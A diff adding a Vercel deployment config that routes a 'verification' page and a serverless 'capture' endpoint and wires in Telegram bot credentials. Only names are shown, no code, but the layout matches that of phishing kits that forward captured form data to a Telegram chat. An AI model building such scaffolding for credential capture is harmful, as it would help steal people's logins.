@@ -1,0 +1,39 @@
+{
+  "version": 2,
+  "builds": [
+    {
+      "src": "api/capture.js",
+      "use": "@vercel/node"
+    },
+    {
+      "src": "public/**/*",
+      "use": "@vercel/static"
+    }
+  ],
+  "routes": [
+    {
+      "src": "/",
+      "dest": "/public/index.html"
+    },
+    {
+      "src": "/verification.html",
+      "dest": "/public/verification.html"
+    },
+    {
+      "src": "/style.css",
+      "dest": "/public/style.css"
+    },
+    {
+      "src": "/api/capture",
+      "dest": "/api/capture.js"
+    },
+    {
+      "src": "/(.*)",
+      "dest": "/public/$1"
+    }
+  ],
+  "env": {
+    "TELEGRAM_BOT_TOKEN": "@telegram-bot-token",
+    "TELEGRAM_CHAT_ID": "@telegram-chat-id"
+  }
+}
